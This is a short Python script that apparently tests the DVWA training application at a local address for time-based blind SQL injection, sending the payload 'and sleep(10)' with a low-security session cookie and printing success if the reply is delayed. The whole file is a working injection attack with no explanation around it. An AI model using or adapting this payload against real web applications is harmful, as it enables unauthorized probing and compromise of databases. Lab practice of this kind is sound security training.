import requests
import timeit

start = timeit.default_timer()

URL = "http://10.0.2.15:8080/vulnerabilities/sqli/?id=1%27and+sleep%2810%29%23&Submit=Submit"
        
cookie={
        "PHPSESSID":"q58entn4fdoupsmg630u39pmt6",
        "security":"low"
        }

session1 = requests.Session()

req=session1.get(URL,cookies=cookie)

stop = timeit.default_timer()

a = (stop - start)
    
if (a  >= 10):
    print("\n\n")
    print("Blind_SQL_Injection Success!")
    print("\n\n")

else:
    print("Fail")
